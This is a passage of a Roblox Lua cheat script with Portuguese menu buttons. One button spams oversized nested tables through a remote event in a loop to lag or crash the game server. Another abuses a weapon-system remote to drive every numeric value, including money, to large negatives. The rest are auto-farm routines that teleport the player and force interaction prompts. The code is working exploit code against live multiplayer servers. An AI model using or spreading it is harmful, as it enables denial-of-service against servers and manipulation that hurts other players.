 Section7:CreateButton("Deixar o server com ping alto", function ()
	
	local char = game:GetService('Players').LocalPlayer.Character or nil
	if char then
	char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
	task.wait(0.5)
	char.HumanoidRootPart.Anchored = true
	end
	while wait(0.6) do --// don't change it's the best
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
	local function getmaxvalue(val)
	   local mainvalueifonetable = 499999
	   if type(val) ~= "number" then
		   return nil
	   end
	   local calculateperfectval = (mainvalueifonetable/(val+2))
	   return calculateperfectval
	end
	
	local function bomb(tableincrease, tries)
	local maintable = {}
	local spammedtable = {}
	
	table.insert(spammedtable, {})
	z = spammedtable[1]
	
	for i = 1, tableincrease do
		local tableins = {}
		table.insert(z, tableins)
		z = tableins
	end
	
	local calculatemax = getmaxvalue(tableincrease)
	local maximum
	
	if calculatemax then
		 maximum = calculatemax
		 else
		 maximum = 999999
	end
	
	for i = 1, maximum do
		 table.insert(maintable, spammedtable)
	end
	
	for i = 1, tries do
		 game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
	end
	end
	
	bomb(250, 2) --// change values if client crashes
	end

	
	

 end)

 Section7:CreateButton("Negativar dinheiro", function ()

	local Evt_R = game:service('ReplicatedStorage')["ACS_Engine"].Events:FindFirstChild("Refil")
	local Quant = -99999999999999000999

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("IntValue") or v:IsA("NumberValue") then
			Evt_R:FireServer(v,-(Quant-v.Value))
		end
	end

	
 end)

 -- auto farm sections botoes

 Section8:CreateButton("Auto farm Chatuba RJ(Se estiver muito lento aperte mais 3 ou 2 vezes.)", function ()

-- Define a posição de destino
local destino = Vector3.new(-179.434341, 878.289001, -911.722961, -0.0170178413, 0, -0.999855161, 0, 1, 0, 0.999855161, 0, -0.0170178413) -- Altere as coordenadas para a posição desejada

-- Teletransporta o jogador
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

humanoidRootPart.CFrame = CFrame.new(destino)
   
		local function instantPrompts()
			ProximityPromptSettings = ProximityPromptSettings or {}
		
			local function adjustPrompt(prompt)
				if not ProximityPromptSettings[prompt] then
					ProximityPromptSettings[prompt] = {
						HoldDuration = prompt.HoldDuration,
						RequiresLineOfSight = prompt.RequiresLineOfSight
					}
				end
		
				local success, err = pcall(function()
					prompt.HoldDuration = 0
					prompt.RequiresLineOfSight = false
				end)
		
				if success then
					print("Success: ProximityPrompt ajustado: " .. (prompt.Name or "Sem Nome"))
				else
					warn("Error: " .. tostring(err) .. " no ProximityPrompt: " .. (prompt.Name or "Sem Nome"))
				end
			end
		
			for _, obj in ipairs(workspace:GetDescendants()) do
				if obj:IsA("ProximityPrompt") then
					adjustPrompt(obj)
				end
			end
		
			workspace.DescendantAdded:Connect(function(obj)
				if obj:IsA("ProximityPrompt") then
					adjustPrompt(obj)
				end
			end)
		end
		
		instantPrompts()



		local function activateSpecificPrompts()
			-- Caminho para os prompts que devem ser ativados
			local targetFolder = workspace:GetChildren()[57]["Trabalho lixeiro | by BezinMaker"]
		
			-- Função para ativar os prompts
			local function activatePrompt(prompt)
				local success, err = pcall(function()
					prompt:InputHoldBegin() -- Simula o início do acionamento
					wait(0.1) -- Pequeno atraso para garantir a ativação
					prompt:InputHoldEnd() -- Simula o final do acionamento
				end)
		
				-- Logs para depuração
				if success then
					print("ProximityPrompt ativado: " .. (prompt.Name or "Sem Nome"))
				else
					warn("Erro ao ativar o ProximityPrompt: " .. tostring(err))
				end
			end
		
			-- Função para verificar e ativar prompts específicos
			local function processFolder(folder)
				for _, obj in ipairs(folder:GetDescendants()) do
					if obj:IsA("ProximityPrompt") and (obj.ActionText == "Lixo" or obj.ActionText == "Coletar") then
						activatePrompt(obj)
					end
				end
			end
		
			-- Loop para verificar e ativar os prompts continuamente
			while true do
				processFolder(targetFolder)
				task.wait()
			end
		end
		
		activateSpecificPrompts()



	
 end)

 Section8:CreateButton("Auto farm Policia militar rp Parte 1", function ()

	instantPrompts()


-- Teleport
local ts = game:GetService("TweenService")
local plr = game.Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local pos1 = Vector3.new(2085, 37, -638)
local pos2 = Vector3.new(2087, 36, -484)

local function teleportTo(pos)
    hrp.CFrame = CFrame.new(pos)
end

while true do
    teleportTo(pos1)
    wait(1.4)
    teleportTo(pos2)
    wait(1.1)
end

	
	   
	end)



 Section8:CreateButton("Auto farm Policia militar rp Parte 2", function ()

 -- Auto Proximity Prompt
 local player = game.Players.LocalPlayer
 local prompts = {}
 
 -- Detecta e ativa os ProximityPrompts
 local function activatePrompt(prompt)
	 if prompt:IsA("ProximityPrompt") then
		 fireproximityprompt(prompt)
	 end
 end
 
 -- Monitora o workspace para novos prompts
 workspace.DescendantAdded:Connect(function(descendant)
	 if descendant:IsA("ProximityPrompt") then
		 table.insert(prompts, descendant)
		 activatePrompt(descendant)
	 end
 end)
 
 -- Verifica os prompts existentes
 for _, obj in pairs(workspace:GetDescendants()) do
	 if obj:IsA("ProximityPrompt") then
		 table.insert(prompts, obj)
		 activatePrompt(obj)
	 end
 end
 
 -- Atualização periódica para garantir funcionamento
 while task.wait(0.1) do
	 for _, prompt in ipairs(prompts) do
		 if prompt and prompt:IsA("ProximityPrompt") and prompt.Enabled then
			 activatePrompt(prompt)
		 end
	 end
 end
 
	
 end)
